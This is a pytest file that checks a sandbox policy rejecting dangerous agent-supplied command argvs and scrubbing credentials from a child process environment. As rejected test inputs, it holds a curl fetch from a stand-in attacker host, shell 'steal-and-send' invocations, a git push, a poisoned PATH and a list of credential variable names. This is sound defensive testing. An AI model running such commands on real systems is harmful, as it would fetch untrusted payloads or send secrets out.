"""L0 argv policy + child-env scrub on the audit-DSL ``command_exit_zero`` gate.

The gate's argv can be assembled from free-form agent-supplied directives,
so the runner is a security boundary in its own right. Two properties are
pinned here:

* every argv is routed through
  :func:`~eawf.runtime.sandbox.argv_policy.validate_gate_argv` and a reject
  raises BEFORE :func:`subprocess.run` is reached -- the fake runner in
  these tests fails the test outright if a rejected argv reaches it;
* the child environment is the
  :func:`~eawf.runtime.sandbox.env_scrub.build_child_env` floor for the
  no-auth gate lane, so no parent credential is inherited.

Coverage: allowlist reject, shell-deny reject, path-qualified head,
shell metacharacter, wrapper-recursion reject, git sub-verb reject,
allowlisted pass-through, empty / non-list argv, and the child-env
identity + credential-absence + gate-files pair.
"""

from __future__ import annotations

import os
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import pytest

from eawf.runtime.sandbox.argv_policy import ArgvPolicyError
from eawf.runtime.sandbox.env_scrub import (
    GATE_RUNTIME_LANE,
    build_child_env,
    resolve_binary_dir,
)
from eawf.workflow.audit_dsl import CHECK_REGISTRY, CheckResult, CheckSpec, registry

_GATE_FILES_ENV = "EAWF_GATE_FILES"

#: Parent-environment variables a leaked child env would expose: one per
#: credential family the env-scrub floor drops by omission.
_CREDENTIAL_KEYS: tuple[str, ...] = (
    "AWS_SECRET_ACCESS_KEY",
    "GH_TOKEN",
    "GITHUB_TOKEN",
    "ANTHROPIC_API_KEY",
    "OPENAI_API_KEY",
    "CLAUDE_CODE_OAUTH_TOKEN",
    "SSH_AUTH_SOCK",
    "KUBECONFIG",
)


def _credential_env() -> dict[str, str]:
    """Return each credential key mapped to a derived placeholder value.

    The values are derived rather than written as literals so the fixture
    carries nothing that reads like a real credential.
    """
    return {key: f"not-a-real-value-for-{key.lower()}" for key in _CREDENTIAL_KEYS}


@dataclass
class _Completed:
    """The trio of attributes the runner reads off a finished child."""

    returncode: int = 0
    stdout: str = ""
    stderr: str = ""


@dataclass
class _SpawnRecorder:
    """A spawn stand-in that records the call instead of starting a process.

    Standing in for the spawn is what makes "rejected before any child
    process is spawned" assertable: a rejected argv leaves ``calls`` empty.
    """

    calls: list[dict[str, Any]] = field(default_factory=list)

    def __call__(self, argv: list[str], **kwargs: Any) -> _Completed:
        self.calls.append({"argv": argv, **kwargs})
        return _Completed()


@pytest.fixture
def spawn(monkeypatch: pytest.MonkeyPatch) -> _SpawnRecorder:
    """Replace the runner's spawn so no test ever executes a crafted argv."""
    recorder = _SpawnRecorder()
    monkeypatch.setattr(registry.subprocess, "run", recorder)
    return recorder


def _run_gate(argv: Any, cwd: Path, *, name: str = "G-1") -> CheckResult:
    """Run one ``command_exit_zero`` check over *argv* through the registry."""
    spec = CheckSpec(kind="command_exit_zero", name=name, args={"argv": argv, "scope": "all"})
    return CHECK_REGISTRY["command_exit_zero"](spec, cwd.resolve())


# ---- CR-01: the check builder validates argv before spawning ---------------


def test_check_builder_validates_gate_argv(spawn: _SpawnRecorder, tmp_path: Path) -> None:
    """A crafted argv off the allowlist raises before any child is spawned."""
    with pytest.raises(ArgvPolicyError, match="not in the caller-supplied allowlist"):
        _run_gate(["curl", "https://attacker.invalid/payload"], tmp_path)
    assert spawn.calls == [], "a rejected argv reached subprocess.run"


def test_check_builder_validates_gate_argv_shell_deny(
    spawn: _SpawnRecorder, tmp_path: Path
) -> None:
    """A shell head is refused by the deny floor, allowlist notwithstanding."""
    with pytest.raises(ArgvPolicyError, match="shell-deny floor"):
        _run_gate(["sh", "-c", "steal-and-send"], tmp_path)
    assert spawn.calls == []


def test_check_builder_validates_gate_argv_path_qualified_head(
    spawn: _SpawnRecorder, tmp_path: Path
) -> None:
    """A path-qualified head cannot sidestep the allowlist lookup."""
    with pytest.raises(ArgvPolicyError, match="bare command"):
        _run_gate(["/usr/bin/pytest", "-q"], tmp_path)
    assert spawn.calls == []


def test_check_builder_validates_gate_argv_shell_metachar(
    spawn: _SpawnRecorder, tmp_path: Path
) -> None:
    """A shell metacharacter anywhere in argv is refused."""
    with pytest.raises(ArgvPolicyError, match="shell metacharacter"):
        _run_gate(["pytest", "tests/*"], tmp_path)
    assert spawn.calls == []


def test_check_builder_validates_gate_argv_through_wrapper(
    spawn: _SpawnRecorder, tmp_path: Path
) -> None:
    """The wrapper recursion refuses a denied head hidden behind ``uv run``."""
    with pytest.raises(ArgvPolicyError, match="shell-deny floor"):
        _run_gate(["uv", "run", "bash", "-lc", "steal-and-send"], tmp_path)
    assert spawn.calls == []


def test_check_builder_validates_gate_argv_git_subverb(
    spawn: _SpawnRecorder, tmp_path: Path
) -> None:
    """A mutating git sub-verb is refused even though ``git`` is allowlisted."""
    with pytest.raises(ArgvPolicyError, match="denied set"):
        _run_gate(["git", "push", "origin", "main"], tmp_path)
    assert spawn.calls == []


def test_check_builder_validates_gate_argv_allows_allowlisted_head(
    spawn: _SpawnRecorder, tmp_path: Path
) -> None:
    """An allowlisted argv passes through to the spawn unchanged."""
    result = _run_gate(["uv", "run", "pytest", "-q"], tmp_path)
    assert result.passed is True
    assert [call["argv"] for call in spawn.calls] == [["uv", "run", "pytest", "-q"]]


def test_check_builder_validates_gate_argv_single_element(
    spawn: _SpawnRecorder, tmp_path: Path
) -> None:
    """A one-element allowlisted argv is the shortest vector that can pass."""
    result = _run_gate(["ruff"], tmp_path)
    assert result.passed is True
    assert [call["argv"] for call in spawn.calls] == [["ruff"]]


def test_check_builder_validates_gate_argv_empty_raises(
    spawn: _SpawnRecorder, tmp_path: Path
) -> None:
    """An empty argv fails the args schema before the policy is consulted."""
    with pytest.raises(ValueError, match="invalid args"):
        _run_gate([], tmp_path)
    assert spawn.calls == []


def test_check_builder_validates_gate_argv_non_list_raises(
    spawn: _SpawnRecorder, tmp_path: Path
) -> None:
    """A bare string argv -- the classic injection shape -- is refused."""
    with pytest.raises(ValueError, match="invalid args"):
        _run_gate("ruff check .", tmp_path)
    assert spawn.calls == []


# ---- CR-02: the child environment is the scrubbed floor --------------------


def test_command_gate_child_env_is_scrubbed(
    spawn: _SpawnRecorder, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The gate child env IS ``build_child_env`` plus the gate's own file set."""
    credentials = _credential_env()
    for key, value in credentials.items():
        monkeypatch.setenv(key, value)

    _run_gate(["ruff", "check"], tmp_path)

    child_env = dict(spawn.calls[0]["env"])
    gate_files = child_env.pop(_GATE_FILES_ENV)
    expected = build_child_env(
        GATE_RUNTIME_LANE,
        extra_path_dir=resolve_binary_dir("ruff"),
    )
    assert child_env == expected
    assert gate_files == ""


def test_command_gate_child_env_drops_parent_credentials(
    spawn: _SpawnRecorder, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """No credential-bearing parent variable survives into the gate child."""
    credentials = _credential_env()
    for key, value in credentials.items():
        monkeypatch.setenv(key, value)

    _run_gate(["ruff", "check"], tmp_path)

    child_env = dict(spawn.calls[0]["env"])
    leaked = sorted(key for key in credentials if key in child_env)
    assert leaked == []
    assert not any(value in child_env.values() for value in credentials.values())


def test_command_gate_child_env_pins_path_floor(
    spawn: _SpawnRecorder, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The child PATH is the pinned floor, never the operator's own PATH."""
    monkeypatch.setenv("PATH", f"/attacker/bin{os.pathsep}{os.environ['PATH']}")

    _run_gate(["ruff", "check"], tmp_path)

    child_path = spawn.calls[0]["env"]["PATH"]
    assert child_path.endswith("/usr/bin:/bin:/usr/sbin:/sbin")
    assert "/attacker/bin" not in child_path


def test_command_gate_child_env_publishes_empty_gate_files(
    spawn: _SpawnRecorder, tmp_path: Path
) -> None:
    """``scope=all`` still publishes the file-set var, empty, not absent.

    The child has to be able to tell "no scope filter" from "the scope
    evaluated to nothing", so the variable is always present.
    """
    _run_gate(["ruff", "check"], tmp_path)

    assert spawn.calls[0]["env"][_GATE_FILES_ENV] == ""


def test_command_gate_child_env_unknown_lane_raises() -> None:
    """``build_child_env`` fails fast on a lane it has no allowlist for."""
    with pytest.raises(ValueError, match="unknown runtime lane"):
        build_child_env("not-a-lane")
